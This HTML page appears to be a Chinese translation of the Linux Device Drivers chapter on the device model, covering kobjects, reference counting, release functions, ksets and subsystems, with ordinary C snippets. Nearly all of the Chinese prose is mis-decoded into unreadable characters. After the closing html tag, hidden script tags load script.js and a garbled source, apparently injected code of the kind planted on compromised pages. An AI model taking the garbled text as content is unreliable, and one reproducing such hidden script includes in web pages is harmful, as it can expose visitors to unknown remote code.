<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;14&#160;&#160;Linux 豸ģ-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch13s06.html" title="13.6.&#160;ٲο">
<link rel="next" href="ch14s02.html" title="14.2.&#160;ͼ sysfs ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;14&#160;&#160;Linux 豸ģ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch13s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch14s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="TheLinuxDeviceModel.chap"></a>&#160;14&#160;&#160;Linux 豸ģ</h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch14.html#KobjectsKsetsandSubsystems.sect">14.1. Kobjects, Ksets  Subsystems </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14.html#KobjectBasics.sect">14.1.1. Kobject </a></span></dt>
<dt><span class="sect2"><a href="ch14.html#KobjectHierachiesKsetsandSubsystems.sect">14.1.2. kobject , kset, ϵͳ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s02.html">14.2. ͼ sysfs </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s02.html#DefaultAttributes.sect">14.2.1. ȱʡ</a></span></dt>
<dt><span class="sect2"><a href="ch14s02.html#NondefaultAttributes.sect">14.2.2. ȱʡ</a></span></dt>
<dt><span class="sect2"><a href="ch14s02.html#BinaryAttributes.sect">14.2.3. </a></span></dt>
<dt><span class="sect2"><a href="ch14s02.html#SymbolicLinks.sect">14.2.4. </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s03.html">14.3. Ȳ¼</a></span></dt>
<dd><dl><dt><span class="sect2"><a href="ch14s03.html#HotplugOperations.sect">14.3.1. Ȳβ</a></span></dt></dl></dd>
<dt><span class="sect1"><a href="ch14s04.html">14.4. , 豸, </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s04.html#Buses.sect">14.4.1. </a></span></dt>
<dt><span class="sect2"><a href="ch14s04.html#Devices.sect">14.4.2. 豸</a></span></dt>
<dt><span class="sect2"><a href="ch14s04.html#DeviceDrivers.sect2">14.4.3. 豸</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s05.html">14.5. </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s05.html#TheclasssimpleInterface.sect2">14.5.1. class_simple ӿ</a></span></dt>
<dt><span class="sect2"><a href="ch14s05.html#TheFullClassInterface.sect2">14.5.2. ӿ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s06.html">14.6. </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s06.html#AddaDevice.sect2">14.6.1. һ豸</a></span></dt>
<dt><span class="sect2"><a href="ch14s06.html#RemoveaDevice.sect2">14.6.2. ȥһ豸</a></span></dt>
<dt><span class="sect2"><a href="ch14s06.html#AddaDriver.sect2">14.6.3. һ</a></span></dt>
<dt><span class="sect2"><a href="ch14s06.html#RemoveaDriver.sect2">14.6.4. ȥһ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s07.html">14.7. Ȳ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s07.html#DynamicDevices.sect2">14.7.1. ̬豸</a></span></dt>
<dt><span class="sect2"><a href="ch14s07.html#ThesbinhotplugUtility.sect2">14.7.2. /sbin/hotplug </a></span></dt>
<dt><span class="sect2"><a href="ch14s07.html#Usingsbinhotplug.sect2">14.7.3. ʹ /sbin/hotplug </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s08.html">14.8. ̼</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s08.html#TheKernelFirmwareInterface.sect2">14.8.1. ں˹̼ӿ</a></span></dt>
<dt><span class="sect2"><a href="ch14s08.html#HowItWorks.sect2">14.8.2. ι</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch14s09.html">14.9. ٲο</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch14s09.html#Kobjects.sect2">14.9.1. Kobjectsṹ</a></span></dt>
<dt><span class="sect2"><a href="ch14s09.html#SysfsOperations.sect2">14.9.2. sysfs </a></span></dt>
<dt><span class="sect2"><a href="ch14s09.html#BusesDevicesandDrivers.sect2">14.9.3. , 豸, </a></span></dt>
<dt><span class="sect2"><a href="ch14s09.html#Classes.sect2">14.9.4. </a></span></dt>
<dt><span class="sect2"><a href="ch14s09.html#Firmware.sect2">14.9.5. ̼</a></span></dt>
</dl></dd>
</dl>
</div>
<p> 2.5 ѭһĿΪں˴һͳһ豸ģ. ֮ǰںûеһݽṹ, ʹǿȡϵͳϵϢ. ȱϢ, ʱҲеĲ. ϵͳ, ǵĸӸӵļҪ֧Դ, , ҪҪһͨõϵͳṹĳ.</p>
<p>2.6 豸ģṩ. ںֹ֧㷺, :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>Դϵͳػ</span></span></dt>
<dd><p>ЩҪһϵͳĽṹ. , һ USB ܱر, ڴеӵ豸֮ǰ. 豸ģʹһȷ˳ϵͳӲı.</p></dd>
<dt><span class="term"><span>ûռͨѶ</span></span></dt>
<dd><p>sysfs ļϵͳʵֱܵ豸ģ, ұ¶Ľṹ. ϵͳûռϢṩ͸ıŦԽԽͨ sysfs  ͨ豸ģ.</p></dd>
<dt><span class="term"><span>Ȳ豸</span></span></dt>
<dd><p>Ӳض̬仯; ûһʱͷ. ںʹõ(ر)ûռ豸ͰγͨѶ, 豸ģ.</p></dd>
<dt><span class="term"><span>豸</span></span></dt>
<dd><p>ϵͳಿֶ豸ûȤ, Ҫ֪ʲô͵豸. 豸ģͰһ豸, һߵĹԵļЩ豸, Ǵûռ䱻.</p></dd>
<dt><span class="term"><span></span></span></dt>
<dd><p>Ĺ, Ȳֺ֧ sysfs,  ʹںдͲ. 豸ģ͵ʵҪ󴴽һ׻, ֮Ĺϵ, ûռıʾ.</p></dd>
</dl></div>
<p>Linux 豸ģһӵݽṹ. , ͼ<a href="ch14.html#ldd3-14-1.fig" title="ͼ&#160;14.1.&#160;豸ģ͵һС">豸ģ͵һС</a>, չʾ(ü򵥵ʽ) USB 豸ģͽṹ΢СƬ. ͼĵ·, ǿ"豸", չʾӵϵͳ. "bus"ʲôӵÿ, "classes" µ漰豸ṩĹ, ӵ. 豸ģһ򵥵ϵͳҲٸڵ, ͬͼչʾЩ; һֵݽṹ.</p>
<div class="figure">
<a name="ldd3-14-1.fig"></a><p class="title"><b>ͼ&#160;14.1.&#160;豸ģ͵һС</b></p>
<div><img src="images/snagitldd3/ldd3-14-1.png" alt="豸ģ͵һС"></div>
</div>
<p>Դ󲿷, Linux 豸ģʹ븺Щ, ǿԼ֮. 󲿷λں; 豸ģ͵ֱӽͨһ߼͸ںϵͳ. , ߻ȫ豸ģ, չԼ.</p>
<p>ʱ, , 豸ģһ. ʱ豸ģʹĲ޳; , ͨõ DMA ( ڵ 15 ) ʹ struct device. ʹһЩ豸ģṩ, ü kobjects ṩɫ. ͨ sysfs  ûռͨѶҲһ豸ģ͹; ½ͨѶι.</p>
<p>, ǿʼһԵ׶ϵ豸ģ͵ı. 豸ģ͵ĸʹڴһ߲ӽ. ǵϣ, ͨչʾͲ豸ι, ǿΪ׼ս, ЩĽṹ.</p>
<p>Դ󲿷ֶ, ¿Ϊ߼,Ҫڵһζ. Щ Linux 豸ģιȤŬǰ, , ǽײϸʱ.</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="KobjectsKsetsandSubsystems.sect"></a>14.1.&#160;Kobjects, Ksets  Subsystems </h2></div></div></div>
<p>Kobject ǻĽṹ, 豸ģһ. ʼΪһ򵥵ü, ʱ, Լս. struct kobject ִ֧ڰ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>ü</span></span></dt>
<dd><p>, һں˶󱻴, ûз֪ڶ೤ʱ. һֶָڵķͨü. ûں˴жԸ, ǸѾҿԱɾ.</p></dd>
<dt><span class="term"><span>sysfs ʾ</span></span></dt>
<dd><p> sysfs гֵÿ涼һ kobject, ں˽Ŀɼʾ.</p></dd>
<dt><span class="term"><span>ݽṹճ</span></span></dt>
<dd><p>豸ģ, , һ˸ӵɶ༶ɵݽṹ, ֮. kobject ʵṹұһ.</p></dd>
<dt><span class="term"><span>Ȳ¼</span></span></dt>
<dd><p>kobject ϵͳ¼Ĳ, ¼֪ͨûռϵͳӲȥ.</p></dd>
</dl></div>
<p>ܴǰбܽ kobject һӵĽṹ. ǶԵ. ͨһοһ, , пṹι.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="KobjectBasics.sect"></a>14.1.1.&#160;Kobject </h3></div></div></div>
<p>һ kobject  struct kobject;  &lt;linux/kobject.h&gt; ж. ļ kobject صĽṹ, һǵĺĳб.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Embeddingkobjects.sect"></a>14.1.1.1.&#160;Ƕ kobjects</h4></div></div></div>
<p>ǽϸǰ, ֵûЩʱʹ kobjects. ؿ kobjects ĺб, ῴǶǴеķ. һ kobject, 仰˵, ԼٸȤ; ڽΪ˽һ߼豸ģ.</p>
<p>, ں˴(֪)һ kobject; ෴, kobject ƴȡ, ضĶ. Ϊ, kobject Ƕ뵽ṹ. ϰ￼, kobject ɱһ, , . һ kobject ʵһϵй, ЩܶԼرöǺõ. C Բֱӱ̳, ļ -- 罫һṹǶһ -- ʹ.</p>
<p>Ϊһ, ǻؿ struct cdev, ڵ 3 . Ǹṹ, ͬ 2.6.10 ںзֵ, :</p>
<pre class="programlisting">
struct cdev {
 struct kobject kobj;
 struct module *owner;
 struct file_operations *ops;
 struct list_head list;
 dev_t dev;
 unsigned int count; 
};
</pre>
<p>ǿԿ, cdev ṹһ kobject Ƕ. һĽṹ, ᷢǶ kobject ֻʹ kobj Ա. ʹ kobjects Ĵ෴, : һ struct kobject ָ, ʲôָṹָ? Ӧ(ٶ kobject ڽṹĿʼ), , ෴, ʹ container_of  (ڵ 3 µ"open "һнܵ). תһָǶһṹ cdev еһ struct kobject ָ kp ķ:</p>
<pre class="programlisting">
struct cdev *device = container_of(kp, struct cdev, kobj); 
</pre>
<p>Աһ򵥵ĺ"ת" kobject ָ뵽.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Kobjectinitialization.sect"></a>14.1.1.2.&#160;kobject ʼ</h4></div></div></div>
<p>Ѿչʾ, м򵥵ڱʱʼ. һ kobject ĳʼЩ, رʹкʱ. һ kobject ʹ, , м.</p>
<p>Щĵһǽ kobject Ϊ 0, ʹһ memset ĵ. ʼΪ kobjiect ǶĽṹһ. һ kobject ʧܵ·ǳֵı, һ; ⲻһ.</p>
<p>һһЩڲԱ, ʹö kobject_init() ĵ:</p>
<pre class="programlisting">
void kobject_init(struct kobject *kobj); 
</pre>
<p>, kobject_init  kobject üΪ 1.  kobject_init , . kobject û, ,  kobject .  sysfs ڵ. ں˴, Էֱӿһַ kobject ӳԱĴ, Ӧ. ෴, ʹ:</p>
<pre class="programlisting">
int kobject_set_name(struct kobject *kobj, const char *format, ...); 
</pre>
<p>һ printk ıб. Ż, ֲʵϿʧ( ͼڴ ); εĴӦ鷵ֵԵӦ.</p>
<p>ɴӦõ kobject Ա, ֱӻ,  ktype, kset,  parent. ڱԺЩ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Referencecountmanipulation.sect"></a>14.1.1.3.&#160;üĲ</h4></div></div></div>
<p>һ kobject һؼΪһü, һǶĶ. ֻҪô, ( ֧Ĵ) . һ kobject üĵͼ:</p>
<pre class="programlisting">
struct kobject *kobject_get(struct kobject *kobj);
void kobject_put(struct kobject *kobj);
</pre>
<p>һ kobject_get ĳɹõ kobject  üҷһָ kobject ָ. , ,  kobject ѾڱٵĹ, ʧ,  kobject_get  NULL. ֵǱ, ܵ޷˲ľ.</p>
<p>һñͷ,  kobject_put ĵõݼü, ҿܵ, ͷ. ס kobject _init üΪ 1; ˵㴴һ kobject, ӦȷӦزȡ kobject_put , ʼòҪ.</p>
<p>ע, ,  kobject еüֹܲ. һ kobject Ĵ( Լİṹ ) ܷǳ, , Ҫ kobject ģļ.  kobject ȻڱʱжǸģ. Ϊʲô濴 cdev ṹһ struct module ָ. struct cdev üʵ:</p>
<pre class="programlisting">
struct kobject *cdev_get(struct cdev *p) 
{
 struct module *owner = p-&gt;owner;
 struct kobject *kobj;
 if (owner &amp;&amp; !try_module_get(owner))
 return NULL;
 kobj = kobject_get(&amp;p-&gt;kobj);
 if (!kobj)
 module_put(owner);
 return kobj;
}
</pre>
<p>һ cdev ṹûҪһӵģ. , cdev_get ʹ try_module_get ͼģʹü. ɹ, kobject_get ͬ kobject ü. Ǹʧ, Ȼ,  kobject_get ķֵͷĶģûн.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Releasefunctionsandkobjecttypes.sect"></a>14.1.1.4.&#160;ͷź kobject </h4></div></div></div>
<p>ȻȱʧһҪǵһ kobject ü 0 ʱᷢʲô.  kobject Ĵ֪ͨʲôʱҪ; ֪, ڵһλʹһüû. 㵱 sysfs ʱԤĶڱøӸ; ûռɱһ kobject ( ͨһĹ sysfs ļ )һʱ.</p>
<p>Ľһ kobject Ľṹ޷κһ, Ԥеĵ㱻ͷ, ǿڱ׼ kobject ü 0 κʱеĴ. üڴ kobject Ĵֱӿ֮. 뱻첽֪ͨ, ۺʱ kobject ʧ.</p>
<p>֪ͨ kobject һͷź. , һʽ:</p>
<pre class="programlisting">
void my_object_release(struct kobject *kobj)
{

 struct my_object *mine = container_of(kobj, struct my_object, kobj); 

/* Perform any additional cleanup on this object, then... */
 kfree(mine);
}
</pre>
<p>ҪǿҪһ: ÿ kobject һͷź,  kobject ( һµ״̬ ) ֱ. ЩƲ, ȱ. ʹʱͷŻз, ñغ޷ͷŶ.</p>
<p>Ȥ, ͷŷûд洢 kobject ; ෴,  kobject Ľṹ. ͱ, һ struct kobj_type ṹ, 򵥵سΪһ "ktype". ṹ:</p>
<pre class="programlisting">
struct kobj_type {
 void (*release)(struct kobject *);
 struct sysfs_ops *sysfs_ops;
 struct attribute **default_attrs;
};
</pre>
<p> struct kobj_type е release Ա, Ȼ, һָ kobject ͵ release ָ. ǽص 2 Ա( sysfs_ops  default_attrs )ڱº.</p>
<p>ÿһ kobject Ҫһ kobj_type ṹ. ׻, ָṹָ 2 ͬĵطҵ. kobject ṹһԱ(Ϊ ktype)ָ. ,  kobject һ kset ĳԱ, kobj_type ָ kset ṩ. ( ǽһڲ鿴 ksets. ) , 궨:</p>
<pre class="programlisting">
struct kobj_type *get_ktype(struct kobject *kobj); finds the kobj_type pointer for a given kobject. 
</pre>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="KobjectHierachiesKsetsandSubsystems.sect"></a>14.1.2.&#160;kobject , kset, ϵͳ</h3></div></div></div>
<p>kobject ṹӶһ㼶Ľṹ, ƥģϵͳĽṹ.  2 ֿĻƶ: parent ָ ksets.</p>
<p>ڽṹ kobject е parent Աһָָ -- ڲ֮ϵһ. , , һ kobject ʾһ USB 豸,  parent ָָʾ豸 hub.</p>
<p>parent ָҪ; sysfs жλ. ǽι, "ͼ sysfs "һ.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Ksets.sect"></a>14.1.2.1.&#160;Ksets </h4></div></div></div>
<p>ܶ, һ kset һ kobj_type ṹչ; һ kset һǶ뵽ͬͽṹ kobject ļ. , Ȼ struct kobj_type עһ, struct kset ۺϺͼע.  2 ѱֿһ͵ĶԳڲͬļ.</p>
<p>, һ kset Ҫ; ɱĸ kobjects . ʵ, ÿ kset ڲԼ kobject, , , ͬһ kobject ͬķʽԴ. ֵע ksets һֱ sysfs г; һһ kset ѱҼ뵽ϵͳ, һ sysfs Ŀ¼. kobjects ûбҪ sysfs г, ÿ kset Ա kobject .</p>
<p>һ kobject һ kset һ󴴽ʱ; һ 2 Ĺ. kobject  kset Ա ???; kobject Ӧݵ:</p>
<pre class="programlisting">
int kobject_add(struct kobject *kobj); 
</pre>
<p>糣, ԱӦСʧ(һ)ӦطӦ. һںṩķ㺯:</p>
<pre class="programlisting">
extern int kobject_register(struct kobject *kobj); 
</pre>
<p>һ kobject_init  kobject_add Ľ.</p>
<p>һ kobject ݸ kobject_add, ü. kset ɵ, Ͼ, һ. ĳ, kobject Ҫ kset Ƴ; ʹ:</p>
<pre class="programlisting">
void kobject_del(struct kobject *kobj); 
</pre>
<p>һ kobject_unregister ,  kobject_del  kobject_put Ľ.</p>
<p>һ kset Ůһ׼ں. ڴ󲿷,  kobjects Ҳָ kset ָ( , ϸ, Ƕ kobject)ǵ parent ĳԱ. , ͵, һ kset  kobjects Щͼ <a href="ch14.html#ldd3-14-2.fig" title="ͼ&#160;14.2.&#160;һ򵥵 kset ">һ򵥵 kset </a>. ס:</p>
<div class="figure">
<a name="ldd3-14-2.fig"></a><p class="title"><b>ͼ&#160;14.2.&#160;һ򵥵 kset </b></p>
<div><img src="images/snagitldd3/ldd3-14-2.png" alt="һ򵥵 kset "></div>
</div>
<div class="itemizedlist"><ul type="disc">
<li><p>ͼееı kobjects ʵϱǶһЩ,  ksets.</p></li>
<li><p>һ kobject  parent Ҫǰ kset( κֵ֯ĺϡٵ).</p></li>
</ul></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Operationsonksets.sect"></a>14.1.2.2.&#160;ksets ֮ϵĲ</h4></div></div></div>
<p>ڳʼ, ksets һӿڷǳ kobjects. к:</p>
<pre class="programlisting">
void kset_init(struct kset *kset);
int kset_add(struct kset *kset);
int kset_register(struct kset *kset);
void kset_unregister(struct kset *kset);
</pre>
<p>Դ󲿷, Щֻ kset ǶϵƵ kobject_ .</p>
<p>Ϊ ksets ü, ͬ:</p>
<pre class="programlisting">
struct kset *kset_get(struct kset *kset);
void kset_put(struct kset *kset);
</pre>
<p>һ kset һ, 洢Ƕ kobject. , һ kset Ϊ my_set, 㽫:</p>
<pre class="programlisting">
kobject_set_name(&amp;my_set-&gt;kobj, "The name");
</pre>
<p>ksets һָ(  ktye Ա )ָ kobject_type ṹ kobject.  kobject е ktype Ա. , ڵ͵Ӧ,  struct kobject е ktype ԱΪ NULL, Ϊ kset еͬԱʵʹõǸ.</p>
<p>, һ kset һϵͳָ(Ϊ subsys). ʱϵͳ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Subsystems.sect"></a>14.1.2.3.&#160;ϵͳ</h4></div></div></div>
<p>һϵͳΪһںһ߼ֵĴ. ϵͳ(ǲһֱ) sysfs εĶ. һЩںеϵͳ block_subsys(/sys/block, 豸), devices_subsys(/sys/devices, 豸), Լһϵͳÿں֪. һ߼ӲҪһϵͳ; , ϸ. Ҫʲô, , һ, ͬ""һ.</p>
<p>һϵͳһ򵥽ṹ:</p>
<pre class="programlisting">
struct subsystem {
 struct kset kset;
 struct rw_semaphore rwsem; 
}; 
</pre>
<p>һϵͳ, , ʵֻһ kset İװ, һ궪.</p>
<p>ÿ kset һϵͳ. ϵͳԱϵ kset λڲ, , Ҫ, ϵͳ rwsem л kset ڲĴȡ. Աϵ struct kset е subsys ָʾ. , Դ kset Ľṹҵÿ kset İϵͳ, ȴ޷ֱӴϵͳṹֶϵͳе kset. </p>
<p>ϵͳһĺ:</p>
<pre class="programlisting">
decl_subsys(name, struct kobj_type *type, struct kset_hotplug_ops *hotplug_ops);
</pre>
<p>괴һ struct subsystem ʹһӲ׺ _subsys γɵ. 껹ʼڲ kset ʹø type  hotplug_ops. ( ڱºȲβ). </p>
<p>ϵͳͨĽͲж:</p>
<pre class="programlisting">
void subsystem_init(struct subsystem *subsys);
int subsystem_register(struct subsystem *subsys);
void subsystem_unregister(struct subsystem *subsys);
struct subsystem *subsys_get(struct subsystem *subsys)
void subsys_put(struct subsystem *subsys);
</pre>
<p>󲿷Щֻϵͳ kset.</p>
</div>
</div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch13s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch14s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">13.6.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;14.2.&#160;ͼ sysfs </td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>